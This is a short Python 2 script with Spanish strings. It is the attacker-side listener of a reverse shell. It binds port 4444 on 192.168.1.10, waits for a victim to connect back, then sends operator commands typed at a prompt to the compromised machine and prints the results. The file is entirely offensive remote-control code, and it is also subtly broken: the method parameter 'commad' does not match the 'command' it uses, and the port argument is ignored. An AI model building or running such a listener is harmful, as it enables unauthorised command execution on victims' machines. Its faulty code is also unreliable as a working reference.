import socket

class Listener: 
    def __init__(self, ip, port):
        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        Listener.bind((ip, 4444))
        Listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection, Address = Listener.accept()
        print("[+] Tenemos una conexion de " + str(Address))

    def ejecutar_remoto(self, commad):
        self.connection.send(command)
        return self.connection.recv(1024)


    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.ejecutar_remoto(command)
            print(result)

escuchar = Listener("192.168.1.10", 4444)
escuchar.run()